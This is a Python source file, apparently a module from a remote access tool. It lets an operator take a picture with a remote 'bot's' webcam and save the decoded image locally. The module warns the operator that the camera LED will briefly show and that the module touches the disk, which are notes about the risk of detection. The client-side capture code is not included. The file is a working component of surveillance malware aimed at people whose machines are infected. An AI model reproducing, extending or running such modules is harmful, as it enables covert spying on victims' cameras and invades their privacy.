# -*- coding: utf-8 -*-
__author__ = "Marten4n6"
__license__ = "GPLv3"

from base64 import b64decode
from os import mkdir

from server.modules.helper import *


class Module(ModuleABC):
    def get_info(self):
        return {
            "Author:": ["Marten4n6"],
            "Description": "Take a picture using the bot's webcam.",
            "References": [
                "https://github.com/rharder/imagesnap"
            ],
            "Stoppable": False
        }

    def get_setup_messages(self):
        return [
            "Local output name (Leave empty for <RANDOM>): "
        ]

    def setup(self, set_options):
        should_continue = self._view.should_continue([
            "A green LED will show next to the bot's camera (for about a second).",
            "This module also touches the disk."
        ])

        if should_continue:
            output_name = set_options[0]

            if not output_name:
                output_name = random_string(8)

            return True, {
                "response_options": {
                    "output_name": output_name
                }
            }
        else:
            return False, None

    def process_response(self, response, response_options):
        output_name = "{}.png".format(response_options["output_name"])
        output_file = path.join(OUTPUT_DIRECTORY, output_name)

        str_response = response.decode()

        if not path.isdir(OUTPUT_DIRECTORY):
            mkdir(OUTPUT_DIRECTORY)

        if "Error executing" in str_response:
            self._view.output(str_response)
        else:
            with open(output_file, "wb") as open_file:
                open_file.write(b64decode(response))

            self._view.output_separator()
            self._view.output("Webcam picture saved to: {}".format(path.realpath(output_file)), "info")
